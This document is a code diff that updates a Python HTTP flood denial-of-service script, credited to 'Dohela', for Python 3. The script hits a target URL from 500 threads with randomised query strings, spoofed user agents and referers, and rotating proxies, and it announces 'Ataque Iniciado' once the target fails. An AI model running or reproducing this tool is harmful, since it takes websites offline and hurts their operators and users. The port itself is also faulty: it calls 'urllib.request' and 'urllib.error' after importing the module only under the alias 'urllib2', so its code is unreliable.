@@ -5,8 +5,7 @@
        # Github : https://github.com/dohelax   #
        #########################################
 
-
-import urllib2
+import urllib.request as urllib2
 import sys
 import threading
 import random
@@ -84,37 +83,34 @@ def httpcall(url):
     useragent_list()
     referer_list()
     code = 0
-    if url.count("?") > 0:
-        param_joiner = "&"
-    else:
-        param_joiner = "?"
-    
+    param_joiner = "&" if url.count("?") > 0 else "?"
+
     request = urllib2.Request(url + param_joiner + buildblock(random.randint(3, 10)) + '=' + buildblock(random.randint(3, 10)))
     request.add_header('User-Agent', random.choice(headers_useragents))
     request.add_header('Cache-Control', 'no-cache')
     request.add_header('Accept-Charset', 'ISO-8859-1,utf-8;q=0.7,*;q=0.7')
     request.add_header('Referer', random.choice(headers_referers) + buildblock(random.randint(5, 10)))
-    request.add_header('Keep-Alive', random.randint(110, 120))
+    request.add_header('Keep-Alive', str(random.randint(110, 120)))
     request.add_header('Connection', 'keep-alive')
     request.add_header('Host', host)
     
     proxy = random.choice(proxies) if proxies else None
     if proxy:
-        proxy_support = urllib2.ProxyHandler({'http': proxy})
-        opener = urllib2.build_opener(proxy_support)
-        urllib2.install_opener(opener)
+        proxy_support = urllib.request.ProxyHandler({'http': proxy})
+        opener = urllib.request.build_opener(proxy_support)
+        urllib.request.install_opener(opener)
     
     try:
-        urllib2.urlopen(request)
-    except urllib2.HTTPError as e:
+        urllib.request.urlopen(request)
+    except urllib.error.HTTPError:
         set_flag(1)
         print('Ataque Iniciado 65000 Bytes By Dohela')
         code = 500
-    except urllib2.URLError as e:
+    except urllib.error.URLError:
         sys.exit()
     else:
         inc_counter()
-        urllib2.urlopen(request)
+        urllib.request.urlopen(request)
     return code
 
 class HTTPThread(threading.Thread):
@@ -163,9 +159,10 @@ if __name__ == "__main__":
 
             load_proxies()
 
-            for i in range(500):
+            for _ in range(500):
                 t = HTTPThread()
                 t.start()
             
             t = MonitorThread()
             t.start()
+
